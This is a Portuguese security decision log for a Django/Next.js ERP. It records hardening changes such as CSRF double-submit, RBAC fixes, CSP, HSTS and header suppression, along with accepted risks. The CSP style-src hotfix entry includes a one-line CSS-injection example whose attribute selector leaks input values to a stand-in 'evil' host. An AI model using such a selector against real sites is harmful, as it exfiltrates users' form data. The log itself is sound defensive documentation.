# Decision Log — Segurança em Produção

Cada entry documenta uma decisão de configuração/arquitetura de segurança em produção, com trade-off e quando revisitar. **Não desfaça uma entry sem ler o "Por quê" e o "Quando revisitar".**

---

## 2026-06-05 — PR #22 (S7C1): Mass assignment + Settings hardening

**Mudanças em prod:**
- `MilestoneSerializer.read_only_fields += [is_completed, completed_at, invoice]`
- `ChangeRequestSerializer.read_only_fields += [status, approved_at]`
- `SupportTicketSerializer.read_only_fields += [status, resolved_at, closed_at, first_response_at, sla_*_deadline]`
- `SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')` em prod
- `CSRF_TRUSTED_ORIGINS` lista explícita (sem wildcard `*.inovasystemssolutions.com`)
- `SECRET_KEY` fallback `django-insecure-dev-only-key` removido
- `TOTP_ENCRYPTION_KEY` fallback hardcoded removido (deriva em dev/CI)
- nginx admin throttle 5/~5h + 2min spacing
- `SECURE_SSL_REDIRECT` default `false` (revertido do `true` defensivo após CI quebrar)

**Trade-offs aceitos:**
- `SECURE_SSL_REDIRECT=false` default: confia que Traefik termina TLS e força HTTPS. Operador habilita via env var em deploy bare-metal sem proxy. Risco residual: zero em Easypanel/Traefik.

**Quando revisitar:**
- Se migrar para deploy bare-metal sem proxy, ativar `SECURE_SSL_REDIRECT=true` via env var.
- Se adicionar novos subdomínios além de `app/erp/cadastro/parceiro`, atualizar `CSRF_TRUSTED_ORIGINS` ou setar `CSRF_EXTRA_TRUSTED_ORIGINS` env var.

**Validado em prod:**
- ✅ Cookies access_token / refresh_token com HttpOnly + Secure + SameSite=Strict (print 2026-06-05)
- ✅ CSRF wildcard removido (settings.py inspeção)
- ✅ Mass assignment bloqueado (Fase 0 baseline check: editar prospect funciona, status não muda via PATCH)

---

## 2026-06-05 — PR #23 (S7C2): JWT SameSite=Strict + CSRF double-submit

**Mudanças em prod:**
- `JWT_COOKIE_SAMESITE = 'Strict'` (era `'Lax'`)
- `CSRF_COOKIE_HTTPONLY = False` (JS lê para double-submit)
- `CSRF_COOKIE_SAMESITE = 'Strict'`
- `JWTCookieAuthentication.enforce_csrf()` valida `X-CSRFToken` em métodos POST/PUT/PATCH/DELETE quando token vem de cookie
- LoginView/2FAVerify/Refresh/PasswordReset com `authentication_classes = []` (sem CSRF check no próprio fluxo de login)
- Frontend `lib/api.ts` injeta `X-CSRFToken` header automaticamente

**Trade-offs aceitos:**
- Bearer header (Authorization) isento de CSRF — atacante cross-origin não pode setar headers customizados (CORS), então isento é seguro.
- `SameSite=Strict` invalida sessões cross-site iniciais (clicar link de email puxando ERP) — usuário precisa logar manualmente, aceitável.

**Quando revisitar:**
- Se precisarmos de "deep links" em emails (clicar link → entra logado), avaliar `SameSite=Lax` com double-submit como compromisso.

**Validado em prod:**
- ✅ CSRF double-submit funcionando (editar prospect = POST com X-CSRFToken passou)
- ✅ csrftoken cookie sem HttpOnly (JS lê)

---

## 2026-06-05 — PR #24 (S7B): RBAC/IDOR/Mass Assignment

**Mudanças em prod:**
- `TimeEntryViewSet.get_queryset` filtra `user=request.user` para operator
- `ProspectSerializer.validate_referred_by` rejeita set/change quando role != admin/manager
- `ProposalViewSet.approve` bloqueia self-approval para operator
- `ContractViewSet.activate` bloqueia self-approval para operator
- `TicketCommentSerializer` is_internal read_only + viewer filter no get_queryset
- `DeliveryApprovalViewSet.respond` virou `detail=False` (sem pk na URL, token explícito >=16 chars)
- `NewLeadsView` paginação `[:100]` + cursor
- `WebsiteLeadCreateView` valida Origin/Referer (default inclui domínios da Inova)
- n8n-bot `is_active=True` + permission class `IsN8NBot`
- `SLAPolicy/SupportCategory/Finance Category` write restritos a admin/manager
- `WEBSITE_ALLOWED_ORIGINS` default = `https://www.inovasystemssolutions.com,https://inovasystemssolutions.com`

**Trade-offs aceitos:**
- `WEBSITE_ALLOWED_ORIGINS` com default não-vazio: deploy sem env var ainda aceita lead form do site principal. Operador adiciona subdomínios via env CSV.

**BREAKING change documentada:**
- Rota `POST /api/v1/projects/delivery-approvals/{pk}/respond/` mudou para `POST /api/v1/projects/delivery-approvals/respond/` (token no body, sem pk na URL). Frontend/API client precisa ajustar se consome.

**Quando revisitar:**
- `WEBSITE_ALLOWED_ORIGINS` default: ao adicionar novos subdomínios públicos.
- Se decisão de negócio mudar e operator precisar ver pipeline completo, ajustar `ProspectViewSet.get_queryset` (atualmente o operator vê apenas atribuídos a ele — mas isso é #27, não #24).

**Validado em prod:**
- ✅ #24 mergeado, deploy success após resolução de incidente de container conflict
- ⚠️ Operator pipeline filter NÃO está em #24 (está em #27, ainda não mergeado)

---

## 2026-06-05 — PR #26 (S7F): Frontend hardening

**Mudanças em prod:**
- CSP nonce-based em `middleware.ts`:
  - `script-src 'self' 'nonce-XXXXX' 'strict-dynamic'` (SEM `unsafe-inline`/`unsafe-eval`)
  - `style-src 'self' 'nonce-XXXXX'` ⚠️ **HOTFIX PENDENTE** — bloqueia inline styles React
- `useCurrentUser` hook + endpoint `/accounts/me/` para buscar role
- `role` removido de `localStorage.user`
- HSTS: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- COOP: `Cross-Origin-Opener-Policy: same-origin`
- CORP: `Cross-Origin-Resource-Policy: same-origin`
- `compiler.removeConsole` em prod (mantém `warn`/`info`)
- `internalBackend.ts` centraliza URLs internas
- CSP iframe de proposta pública: `default-src 'none'; script-src 'none'; ...`

**Trade-offs aceitos:**
- HSTS preload é "one-way ratchet" (2 anos cacheado pelo browser). ERP já é HTTPS-only, sem regressão.
- COOP/CORP `same-origin` quebra `window.opener` cross-origin — aceitável (não usamos).

**Validado em prod:**
- ✅ CSP `script-src` confirmado via auditoria com extensão Claude: `script-src 'self' 'nonce-XXXX' 'strict-dynamic'` sem `unsafe-inline`
- ✅ Cookies + HSTS + COOP/CORP validados
- ⚠️ CSP `style-src` quebrando 24 inline styles (será corrigido na Fase 1.5)

---

## 2026-06-05 — Fase 1.5: CSP style-src (Hotfix do #26)

**Mudança aplicada:**
- `style-src 'self' 'unsafe-inline'` (era `'self' 'nonce-XXXXX'`)

**Trigger do hotfix:**
- Usuário reportou após validação do #26: bonecos animados (`AnimatedCharacters` component) sumiram da tela de login.
- Causa: o componente usa 14 inline styles dinâmicos (`style={{ transform: translate(${x}px, ${y}px) }}`) para animar olhos/cabeça em resposta ao input do usuário. Browsers NÃO aplicam nonce em atributos `style="..."` (só em `<style nonce>` tags), então CSP bloqueava 100% dos estilos.

**Trade-off aceito:**
- CSS injection passa a ser possível (atacante pode mudar visual ou exfil lenta via seletores `[value^=a] { background: url(//evil/a) }`)
- CSS NÃO executa código JavaScript
- `script-src` mantém strict (`'nonce-XXXX' 'strict-dynamic'` sem `unsafe-inline`) — XSS via script BLOQUEADO

**Por que essa decisão:**
- React/Next obrigatoriamente gera `style="..."` em componentes (não há como evitar sem reescrever toda UI)
- Browser não aceita `nonce` em atributos `style="..."` HTML, apenas em `<style nonce>` tags
- OWASP CSP cheatsheet aceita o trade-off para apps React/Vue/Angular
- Vetor de ataque mais grave (XSS via script) continua bloqueado pelo `script-src` strict

**Quando revisitar:**
- Se migrar para zero-runtime CSS (vanilla-extract, Linaria, CSS Modules puros)
- Se OWASP recomendar abordagem nova (ex: CSP Level 4 com extensão para style attrs)
- A cada audit semestral confirmar que o trade-off ainda é necessário

---

## (Pendente) Fase 2 — PR #25 (S7H): Auth hardening

A documentar após merge + validação.

---

## (Pendente) Fase 3a + 3b — PR #27 split: Residuais

A documentar após merge + validação.

---

## Findings da auditoria 2026-06-05 NÃO endereçados (decisão de aceitar risco)

| Finding | Severidade | Por que não corrigir |
|---|---|---|
| Sem HIBP (HaveIBeenPwned) check em senhas | LOW | Adicionar k-anonymity API call adiciona dependência externa + latência em login. `ComplexityValidator` cobre 80% do risco. |
| `inova_role` cookie em plaintext | LOW | Cookie é HttpOnly+Secure+Strict. Exfil exige acesso físico ao browser. Risco residual baixo. |
| Login `temp_token` 2FA em response body | LOW | XSS necessário para explorar, e temos CSP nonce em script-src bloqueando XSS. Defense-in-depth. |
| `client_max_body_size 1m` global poderia ser menor | LOW | 1M já cobre 99% dos JSON requests. Reduzir mais quebra uploads legítimos. |
| Open API docs `/api/docs/` exposto em DEBUG | MEDIUM | Design intencional para dev. Em prod, `DEBUG=False` esconde. |

---

## 2026-06-05 — Fase 2.5: Hotfix higiênico (auditoria via Claude extension)

**Trigger:** auditoria externa via Claude extension identificou 2 LOW findings de fingerprinting.

**Mudanças aplicadas:**
- `frontend/next.config.js`: `poweredByHeader: false` → suprime `X-Powered-By: Next.js`
- `backend/core/middleware.py::SecurityHeadersMiddleware`: remove `Server` e `X-Powered-By` da response (gunicorn adiciona por default)

**Trade-off:**
- Zero impacto funcional (headers invisíveis para usuário)
- Atacante perde sinais imediatos de stack (Next.js + Gunicorn)
- Não bloqueia ataque, mas dificulta reconnaissance (mapping de CVE específico de versão)
- Compliance: requerido por PCI-DSS, ISO 27001 e checklist OWASP

**Decisão de NÃO mexer no spacing do login:**
- Configuração atual: DRF `'login': '5/minute'` (5 tentativas/min/IP)
- Combinado com per-user lockout do #25 (5 falhas reais → 15min exponencial)
- Trade-off de mudar para `1/minute`: usuário típico que typo de senha espera 60s
- Decisão: manter `5/minute` por agora. Per-user lockout cobre o vetor catastrófico.
- Revisitar se houver tentativa de brute-force real observada nos logs.

**Quando revisitar:**
- Se Gunicorn versão futura adicionar outros headers de fingerprinting
- Se Easypanel/Traefik começar a inserir headers próprios revelando stack
